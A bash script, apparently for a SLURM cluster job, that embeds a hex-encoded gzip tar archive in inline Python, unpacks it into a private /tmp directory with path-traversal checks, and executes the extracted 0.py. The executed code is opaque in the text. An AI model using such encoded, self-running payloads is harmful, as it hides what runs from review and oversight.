#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8fdb201086f7ec5f8172b12d45041b7f25ab1c7befa1eda55aad081e2764136301e96e5af5bf17ec68956aa5de76b755e739188399776086c18ceeadee6f5e15e6a9181b5bf6b2659c17cfefd3785557f50d61afbbac899375c278976fe1eb2fe4c7cce907e8672b32131b96e5bc28abba59cee6643688f3418bf6deee445e5661c6b26e60c94b263908a865bdacca8d6c7891b76d57b09a9725eb1a296559d7bcf3e3bcdd9415c8ae6550349c896bd5cdd981f5a2256ff28cd7e1cb41f457ce9ab6c836de87d7f01e3ae0795154edb2ca45ceb38ee54553419ee759d1c91cda6259778295b9ec2ad9d5b28572f6f3bd63fb2fc0e8707e751f7faeff2ccb5ed47f5170acffb7401d076d1cb1673b0f3f82f94ed8dd416de63e289d3a40d4197d24837061905c267ff4ddc8ac439378432accf6dbd7ec2ebd95eba041437ddb24318b988d7f9738a5067cc93b7872499a4662328d1783d17b906e21f5f178ea953b2ff6fb339cfa6d9c2ee4d778bc99e2bb20e3b6dfe348580bdefd658974ba2a1231898ff78957a73b786ad516ac77b55e7b95dfafb1f82e7a546e472efba37a803e11291196b855443a6d0810d58f1da23ad26b4780f6e208341c14678375126b2377c2b4f7bb8c2de2742575ef547f826b1b65838324255e32a6340eaae3be27b9940e416e6584b240be88c3093e18a34d127feeade8c22286938b532f39ac7d2887783119de0ec1127a478f0fad32c9d4b1eb4fe604737852d6ddeb87b197faa98f4639b804c7519f0023a41b1706535642424212438ea9ea43841336b7ce24a353ff753c02571ba67bfd7c148e42f5517824268ddefb2c23088220088220088220088220088220088220088220c8ffca2fb9a0872300280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
